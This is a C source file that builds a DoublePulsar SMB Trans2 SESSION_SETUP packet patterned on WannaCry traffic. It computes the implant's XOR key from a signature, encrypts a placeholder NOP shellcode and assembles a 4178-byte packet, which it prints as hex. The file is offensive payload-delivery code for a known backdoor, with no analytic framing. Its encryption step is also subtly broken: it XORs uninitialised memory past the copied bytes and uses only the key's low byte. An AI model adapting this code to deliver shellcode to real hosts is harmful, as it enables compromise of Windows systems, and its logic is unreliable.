#include <stdio.h>
#include <stdlib.h>
#include <string.h>

unsigned char wannacry_Trans2_Request[] = 
"\x00\x00\x10\x4e\xff\x53\x4d\x42\x32\x00\x00\x00\x00\x18\x07\xc0"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xff\xfe"
"\x00\x08\x42\x00\x0f\x0c\x00\x00\x10\x01\x00\x00\x00\x00\x00\x00"
"\x00\x25\x89\x1a\x00\x00\x00\x0c\x00\x42\x00\x00\x10\x4e\x00\x01"
"\x00\x0e\x00\x0d\x10\x00";

unsigned int ComputeDOUBLEPULSARXorKey(unsigned int sig)
{
	unsigned int x = (2 * sig ^ (((sig & 0xff00 | (sig << 16)) << 8) | (((sig >> 16) | sig & 0xff0000) >> 8))) & 0xffffffff;
	return x;
}

int main()
{
	unsigned int sig = 0x90dfe779;

	//calculate the XOR key for DoublePulsar
	unsigned int XorKey = ComputeDOUBLEPULSARXorKey(sig);
	printf("Calculated XOR KEY:  0x%x\n", XorKey);

	//build buffer with shellcode
	char shellcode[] = "\x90\x90\x90\x90\x90\x90\x90\x90";
	
	//generate the SESSION_SETUP parameters here
	unsigned int TotalSizeOfPayload = sizeof(shellcode) ^ XorKey;
	unsigned int ChunkSize = 4096 ^ XorKey;
	unsigned int OffsetofChunkinPayload = XorKey ^ XorKey;

	//allocate memory for encrypted shellcode payload
	unsigned char *encrypted;
	encrypted = (unsigned char*)malloc(4096+1);

	//copy shellcode to encrypted buffer
	memcpy(encrypted,shellcode, sizeof(shellcode));

  	int i;
	//Xor the data buffer with the calculated key
	for(i=0;i<4096;i++)
	{
		encrypted[i] = encrypted[i] ^ XorKey;
        }

	//build packet buffer with 4178 bytes in length
	//82 bytes for the Trans2 Session Setup packet header
	//then 4096 bytes for the SESSION_SETUP data ( encrypted payload )
	//Then fill the packet with 0x00s and XOR it with the calculated key
	unsigned char *big_packet = (unsigned char*)malloc(4178+1);
	memset(big_packet, 0x00, 4178);
	int bp;
	for(bp=0;bp<4178;bp++)
	{
		big_packet[bp] = big_packet[bp]^XorKey;
        }

	//will use for re-sending the computed XOR key in the Trans2 SESSION_SETUP data parameters
	unsigned char CHAR_XOR_KEY[4];

	CHAR_XOR_KEY[0] = XorKey & 0xFF;
	CHAR_XOR_KEY[1] = (XorKey >> 8) & 0xFF;
	CHAR_XOR_KEY[2] = (XorKey >> 8 >> 8) & 0xFF;
	CHAR_XOR_KEY[3] = (XorKey >> 8 >> 8 >> 8) & 0xFF;

	unsigned char TotalSizeOfPayloadCHAR[4];
	unsigned char ChunkSizeCHAR[4];
	unsigned char OffsetofChunkinPayloadCHAR[4];

	TotalSizeOfPayloadCHAR[0] = TotalSizeOfPayload & 0xFF;
	TotalSizeOfPayloadCHAR[1] = (TotalSizeOfPayload >> 8) & 0xFF;
	TotalSizeOfPayloadCHAR[2] = (TotalSizeOfPayload >> 8 >> 8) & 0xFF;
	TotalSizeOfPayloadCHAR[3] = (TotalSizeOfPayload >> 8 >> 8 >> 8) & 0xFF;

	ChunkSizeCHAR[0] = ChunkSize & 0xFF;
	ChunkSizeCHAR[1] = (ChunkSize >> 8) & 0xFF;
	ChunkSizeCHAR[2] = (ChunkSize >> 8 >> 8) & 0xFF;
	ChunkSizeCHAR[3] = (ChunkSize >> 8 >> 8 >> 8) & 0xFF;

	OffsetofChunkinPayloadCHAR[0] = OffsetofChunkinPayload & 0xFF;
	OffsetofChunkinPayloadCHAR[1] = (OffsetofChunkinPayload >> 8) & 0xFF;
	OffsetofChunkinPayloadCHAR[2] = (OffsetofChunkinPayload >> 8 >> 8) & 0xFF;
	OffsetofChunkinPayloadCHAR[3] = (OffsetofChunkinPayload >> 8 >> 8 >> 8) & 0xFF;

	//copy wannacry skeleton packet to big Trans2 packet
	memcpy(big_packet, wannacry_Trans2_Request, sizeof(wannacry_Trans2_Request));
	
	//copy parameters over
	memcpy(big_packet + sizeof(wannacry_Trans2_Request), TotalSizeOfPayloadCHAR,4);
	memcpy(big_packet + sizeof(wannacry_Trans2_Request) + 4, ChunkSizeCHAR,4);
	memcpy(big_packet + sizeof(wannacry_Trans2_Request) + 8, OffsetofChunkinPayloadCHAR,4);

	//copy encrypted payload
	memcpy(big_packet + sizeof(wannacry_Trans2_Request) + 12,  encrypted, 4096);

  	//send Shellcode in Trans2 Packet
	printf("printing shellcode buffer...\n");
	for(i=0; i<4178; i++)
	{
		printf("%02x", big_packet[i]);
	}

	free(encrypted);
	free(big_packet);

	return 0;
}
